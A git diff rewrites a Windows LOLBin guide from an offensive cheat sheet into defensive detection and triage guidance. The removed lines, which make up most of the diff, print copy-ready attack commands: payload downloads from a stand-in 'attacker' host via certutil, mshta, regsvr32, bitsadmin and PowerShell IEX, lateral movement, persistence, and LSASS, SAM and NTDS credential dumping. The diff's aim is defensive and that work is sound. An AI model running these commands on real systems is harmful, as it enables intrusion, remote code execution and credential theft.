@@ -1,12 +1,9 @@
 # Living Off the Land - LOLBins, LOLBAs, LOLScripts
 
 > [!CAUTION]
-> **Authorized use only.** The techniques below are for authorized security
-> testing, education, and defensive research. Using them against systems you do
-> not own or lack explicit written permission to test is illegal. See
-> [LEGAL.md](../LEGAL.md).
+> **Defensive scope:** This guide describes signals and controls for investigating LOLBin abuse. Use routine administrative tools only under delegated authority and change policy; active testing requires an owner-approved scope. Legal consequences depend on conduct, authorization, and applicable rules. See [LEGAL.md](../LEGAL.md).
 
-> **Scope:** Using legitimate Windows binaries, libraries, and scripts for offensive operations. Includes enumeration, execution, download, lateral movement, and detection/hunting guidance.
+> **Scope:** Defensive triage and detection for abuse of legitimate Windows binaries, libraries, and scripts. This guide does not provide copy-ready payload execution, transfer, credential dumping, or persistence commands.
 
 ✅ **Quick-reference checklists:** [AppLocker Bypass](../Checklists/AppLocker.md) · [Environment Breakout](../Checklists/Environment-Breakout-Checklist.md)
 
@@ -28,16 +25,16 @@
 ---
 
 ## 🎯 Purpose
-A curated, execution-flow-organized walkthrough of Windows LOLBins/LOLBAs - where the [LOLBAS Project](https://lolbas-project.github.io/) is an exhaustive per-binary catalog, this file organizes the same technique space by attacker goal (execution, download, lateral movement, persistence, credential access) so it maps directly onto an engagement's kill chain.
+Defensive overview of how legitimate Windows binaries can be abused, what telemetry may reveal that abuse, and which application controls reduce risk.
 
 ## ⚙️ Function
-Covers what LOLBins are, then sections by offensive goal (execution, download/transfer, lateral movement, persistence, credential harvesting, recon) plus a dedicated LOLDrivers section, closing with detection/hunting and defensive controls. Pairs with the [AppLocker Bypass](../Checklists/AppLocker.md) and [Environment Breakout](../Checklists/Environment-Breakout-Checklist.md) quick-reference checklists; differs from [av-edr-evasion.md](av-edr-evasion.md), which covers evading detection generally rather than specifically abusing trusted signed binaries.
+Covers LOLBin behavior categories, defensive telemetry, LOLDrivers, hunting ideas, and application-control mitigations. Pair with the [application-control checklist](../Checklists/AppLocker.md) and [AV/EDR detection guide](av-edr-evasion.md).
 
 ## 🏆 Goal
-An operator can complete a full attack chain using only signed/trusted Windows binaries (minimizing custom-tool detection surface), and a defender can build detections for that same abuse.
+A defender can recognize abnormal use of trusted binaries and correlate process, file, registry, network, and identity evidence.
 
 ## 📋 When to Use
-When an engagement requires allowlist/AppLocker bypass, or when building detection logic for living-off-the-land abuse on the defensive side.
+When triaging suspicious signed binaries, reviewing application-control coverage, or building detection logic.
 
 ## What is LOLB?
 
@@ -57,371 +54,46 @@ Living Off the Land Binaries and Scripts (LOLBins/LOLBAs) are Microsoft-signed e
 
 ## Execution Techniques
 
-### certutil.exe
+| Binary family | Defensive signal | Investigation focus |
+|---|---|---|
+| certutil, bitsadmin, PowerShell | Unexpected outbound transfer or decode activity | Parent process, URL/domain, destination path, user, and change context |
+| mshta, rundll32, regsvr32 | Scriptlet/HTML/COM activity from unusual parents or locations | Command-line metadata, loaded modules, signer, network connection, and application-control decision |
+| msiexec, installutil, cmstp | Installer or .NET utility launched by an unusual process | Package origin, signature, installer logs, child processes, and policy result |
+| wmic, pcalua, forfiles, csc/vbc | Scripting or process creation outside normal admin workflows | Parent/child chain, target host, script/compiler inputs, and account context |
 
-```cmd
-:: Execute encoded payload
-certutil -decode encoded.b64 payload.exe && payload.exe
-
-:: Download file from URL to disk
-certutil -urlcache -split -f http://attacker/payload.exe C:\Windows\Temp\p.exe
-
-:: Alternative: use certutil to decode a locally staged file
-certutil -decode C:\Windows\Temp\encoded.txt C:\Windows\Temp\shell.exe
-```
-
-### mshta.exe
-
-```cmd
-:: Execute remote HTA
-mshta.exe http://attacker/payload.hta
-
-:: Execute inline VBScript
-mshta.exe vbscript:Close(Execute("GetObject(""script:http://attacker/payload.sct"")"))
-
-:: Execute from file
-mshta.exe C:\Windows\Temp\payload.hta
-```
-
-### rundll32.exe
-
-```cmd
-:: Load and execute a DLL export
-rundll32.exe payload.dll,EntryPoint
-
-:: Execute JavaScript via mshtml
-rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";document.write();GetObject("script:http://attacker/payload.sct")
-
-:: Load via URL (legacy)
-rundll32.exe url.dll,OpenURL http://attacker/payload.hta
-```
-
-### regsvr32.exe (Squiblydoo)
-
-```cmd
-:: Execute remote scriptlet - bypasses AppLocker in script rules
-regsvr32.exe /s /n /u /i:http://attacker/payload.sct scrobj.dll
-
-:: Local execution
-regsvr32.exe /s /n /u /i:C:\Windows\Temp\payload.sct scrobj.dll
-```
-
-### wmic.exe
-
-```cmd
-:: Execute local binary
-wmic.exe process call create "C:\Windows\Temp\payload.exe"
-
-:: Remote execution (requires creds)
-wmic.exe /node:TARGET /user:DOMAIN\User /password:Pass process call create "cmd.exe /c payload.exe"
-
-:: XSL script execution (WMIC + XSL bypass)
-wmic.exe os get /format:"http://attacker/payload.xsl"
-```
-
-### msiexec.exe
-
-```cmd
-:: Install remote MSI
-msiexec.exe /q /i http://attacker/payload.msi
-
-:: Execute DLL via MSI
-msiexec.exe /y C:\Windows\Temp\payload.dll
-
-:: Silent install from local file
-msiexec.exe /quiet /i C:\Windows\Temp\payload.msi
-```
-
-### installutil.exe
-
-```cmd
-:: Execute .NET assembly via InstallUtil (bypasses AppLocker)
-installutil.exe /logfile= /LogToConsole=false /U C:\Windows\Temp\payload.exe
-
-:: Works because InstallUtil calls [RunInstaller] attribute methods
-```
-
-### cmstp.exe
-
-```cmd
-:: Execute via CMSTP INF file (UAC bypass + AppLocker bypass)
-cmstp.exe /s /ns C:\Windows\Temp\payload.inf
-```
-
-### pcalua.exe
-
-```cmd
-:: Execute arbitrary file via Program Compatibility Assistant
-pcalua.exe -a C:\Windows\Temp\payload.exe
-pcalua.exe -a \\attacker\share\payload.exe
-```
-
-### forfiles.exe
-
-```cmd
-:: Execute via forfiles (bypasses some script controls)
-forfiles /p C:\Windows\System32 /m notepad.exe /c "C:\Windows\Temp\payload.exe"
-```
-
-### csc.exe / vbc.exe
-
-```cmd
-:: Compile and execute C# source from disk
-csc.exe /out:C:\Windows\Temp\payload.exe C:\Windows\Temp\payload.cs
-C:\Windows\Temp\payload.exe
-
-:: Compile to DLL for injection
-csc.exe /target:library /out:C:\Windows\Temp\payload.dll C:\Windows\Temp\payload.cs
-```
-
-### PowerShell Execution Bypasses
-
-```powershell
-# Bypass ExecutionPolicy
-powershell -ExecutionPolicy Bypass -File payload.ps1
-powershell -ep bypass -c "IEX (New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')"
-
-# Encoded command
-powershell -EncodedCommand <base64_payload>
-
-# Constrained Language Mode bypass (various methods)
-# CLM prevents certain operations - test your target environment
-```
-
----
+These signed tools are not automatically trusted for every action. For example, regsvr32 has historically been abused to load scriptlets, but success depends on operating-system version and current application-control policy; do not describe it as a reliable AppLocker bypass.
 
 ## Download & Transfer
 
-### certutil.exe
+Look for utilities that create files from remote or encoded content. Correlate process creation with proxy/DNS logs, file creation, signature, prevalence, and subsequent execution. A download event alone does not prove maliciousness.
 
-```cmd
-certutil -urlcache -split -f http://attacker/payload.exe C:\Windows\Temp\payload.exe
-```
-
-### bitsadmin.exe
-
-```cmd
-:: Background Intelligent Transfer Service
-bitsadmin /transfer job /download /priority high http://attacker/payload.exe C:\Windows\Temp\payload.exe
-
-:: Cleaner syntax
-bitsadmin /create job
-bitsadmin /addfile job http://attacker/payload.exe C:\Windows\Temp\payload.exe
-bitsadmin /resume job
-bitsadmin /complete job
-```
-
-### PowerShell
-
-```powershell
-# WebClient
-(New-Object Net.WebClient).DownloadFile('http://attacker/payload.exe','C:\Windows\Temp\p.exe')
-
-# WebRequest (PS 3.0+)
-Invoke-WebRequest -Uri http://attacker/payload.exe -OutFile C:\Windows\Temp\p.exe
-
-# Cradle via IEX (fileless)
-IEX (New-Object Net.WebClient).DownloadString('http://attacker/payload.ps1')
-```
-
-### expand.exe
-
-```cmd
-:: Download and expand cabinet file
-expand \\attacker\share\payload.cab -F:* C:\Windows\Temp\
-```
-
-### esentutl.exe
-
-```cmd
-:: Copy file via ESE database utility
-esentutl.exe /y \\attacker\share\payload.exe /d C:\Windows\Temp\payload.exe /o
-```
-
-### finger.exe (legacy)
-
-```cmd
-:: Encode payload in finger query response
-finger user@attacker.com
-```
-
-### desktopimgdownldr.exe
-
-```cmd
-:: Download file to predictable location (Windows 10)
-set "SYSTEMROOT=C:\Windows\Temp" && cmd /c desktopimgdownldr.exe /lockscreenurl:http://attacker/payload.exe /eventName:desktopimgdownldr
-```
-
----
+**Evidence to preserve:** process tree, full command line where policy permits, DNS/TLS/proxy record, file hash and signer, destination path, and relevant change ticket. Avoid opening or executing recovered files during initial triage.
 
 ## Lateral Movement
 
-### psexec.exe (Sysinternals)
-
-```cmd
-:: Remote execution (requires admin share access)
-psexec.exe \\TARGET -u DOMAIN\User -p Pass cmd.exe
-psexec.exe \\TARGET -u DOMAIN\User -p Pass -d -c payload.exe
-
-:: Using current session token
-psexec.exe \\TARGET cmd.exe
-```
-
-### wmic.exe
-
-```cmd
-:: Remote process creation
-wmic.exe /node:TARGET process call create "cmd.exe /c payload.exe"
-```
-
-### winrs.exe
-
-```cmd
-:: Windows Remote Shell (WinRM)
-winrs.exe -r:TARGET -u:DOMAIN\User -p:Pass "cmd.exe /c payload.exe"
-```
-
-### sc.exe
-
-```cmd
-:: Create and start a remote service
-sc.exe \\TARGET create evilsvc binPath= "C:\Windows\Temp\payload.exe"
-sc.exe \\TARGET start evilsvc
-
-:: Cleanup
-sc.exe \\TARGET delete evilsvc
-```
-
-### reg.exe
-
-```cmd
-:: Remote registry manipulation
-reg.exe add \\TARGET\HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v Evil /t REG_SZ /d "C:\Windows\Temp\payload.exe"
-```
-
-### mstsc.exe / xfreerdp
-
-```cmd
-:: RDP with pass-the-hash (via RDP restricted admin mode)
-mstsc.exe /restrictedAdmin /v:TARGET
-
-:: xfreerdp PTH
-xfreerdp /v:TARGET /u:User /pth:NTLM_HASH /d:DOMAIN
-```
-
----
+Unexpected remote service creation, administrative share access, WMI/WinRM activity, or remote process creation can indicate lateral movement. Validate the source account, destination asset, time window, management tool, and approved change record. Do not treat an admin tool's presence alone as malicious.
 
 ## Persistence via LOLBins
 
-### schtasks.exe
-
-```cmd
-:: Create scheduled task
-schtasks.exe /create /tn "WindowsUpdate" /tr "C:\Windows\Temp\payload.exe" /sc ONLOGON /ru SYSTEM /f
-
-:: Remote scheduled task
-schtasks.exe /create /s TARGET /u DOMAIN\User /p Pass /tn "Update" /tr "payload.exe" /sc DAILY
-
-:: Run and delete
-schtasks.exe /run /tn "WindowsUpdate"
-schtasks.exe /delete /tn "WindowsUpdate" /f
-```
-
-### reg.exe
-
-```cmd
-:: Add to Run key
-reg.exe add "HKCU\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Updater" /t REG_SZ /d "C:\Windows\Temp\payload.exe" /f
-
-:: Add to HKLM (requires elevation)
-reg.exe add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run" /v "Updater" /t REG_SZ /d "C:\Windows\Temp\payload.exe" /f
-```
-
-### wmic.exe
-
-```cmd
-:: Create WMI event subscription (fileless persistence)
-wmic.exe /namespace:\\root\subscription PATH __EventFilter CREATE Name="PersistFilter",EventNameSpace="root\cimv2",QueryLanguage="WQL",Query="SELECT * FROM __InstanceModificationEvent WITHIN 60 WHERE TargetInstance ISA 'Win32_PerfFormattedData_PerfOS_System'"
-```
-
----
+Review unexpected scheduled tasks, Run-key changes, service registrations, WMI subscriptions, and startup-folder writes. Compare creator identity, file signer, path, and change history against the approved baseline. Preserve task/service metadata before containment.
 
 ## Credential Harvesting
 
-### comsvcs.dll (LSASS Dump)
-
-```cmd
-:: Dump LSASS memory via comsvcs.dll MiniDump export
-:: Requires SYSTEM or SeDebugPrivilege
-
-:: Via Task Manager alternative (rundll32)
-rundll32.exe C:\Windows\System32\comsvcs.dll MiniDump <LSASS_PID> C:\Windows\Temp\lsass.dmp full
-
-:: Via PowerShell
-$lsass = Get-Process lsass
-rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump $lsass.Id C:\Windows\Temp\lsass.dmp full
-```
-
-### reg.exe (SAM/SYSTEM/SECURITY Dump)
-
-```cmd
-:: Extract registry hives for offline cracking
-reg.exe save HKLM\SAM C:\Windows\Temp\sam.bak
-reg.exe save HKLM\SYSTEM C:\Windows\Temp\system.bak
-reg.exe save HKLM\SECURITY C:\Windows\Temp\security.bak
-```
-
-### vssadmin / diskshadow (Shadow Copy Credential Access)
-
-```cmd
-:: Create shadow copy and copy NTDS.dit (Domain Controller)
-vssadmin create shadow /for=C:
-copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\Windows\Temp\
-
-:: Via diskshadow script
-diskshadow.exe /s C:\Windows\Temp\shadow.txt
-```
-
----
+Unexpected access to LSASS, registry hives, credential stores, or volume-shadow data can indicate credential theft. Review EDR telemetry and privileges, protect domain-controller backups, enable credential protections, rotate affected secrets, and preserve evidence under the incident plan. This guide does not include dump or extraction commands.
 
 ## Reconnaissance LOLBins
 
-```cmd
-:: Network discovery
-net.exe view /domain
-net.exe group "Domain Admins" /domain
-net.exe user /domain
+Host inventory, domain queries, share enumeration, and network discovery may be part of legitimate administration or suspicious activity. Compare command origin and rate with known management tools, account roles, and approved assessment scope. Correlate with authentication and endpoint telemetry.
 
-:: ARP table
-arp.exe -a
-
-:: Routing table
-route.exe print
-
-:: DNS cache (reveals recent lookups)
-ipconfig.exe /displaydns
-
-:: Shares
-net.exe share
-net.exe use
-
-:: Logged on users (remote)
-qwinsta.exe /server:TARGET
-
-:: Service enumeration
-sc.exe query type= all state= all
-
-:: Firewall rules
-netsh.exe advfirewall firewall show rule name=all
-
-:: PowerShell discovery
-Get-ADUser -Filter * -Properties *
-Get-ADComputer -Filter * -Properties *
-Get-ADGroupMember "Domain Admins"
+```mermaid
+flowchart LR
+    A[Trusted binary starts] --> B[Review parent and command line]
+    B --> C[Correlate file registry and network events]
+    C --> D{Matches approved administration?}
+    D -- Yes --> E[Document change context]
+    D -- No --> F[Preserve evidence and investigate]
+    F --> G[Contain under incident response plan]
 ```
-
----
-
 ## LOLDrivers
 
 Vulnerable signed drivers can be used to execute code in kernel mode (BYOVD - Bring Your Own Vulnerable Driver).
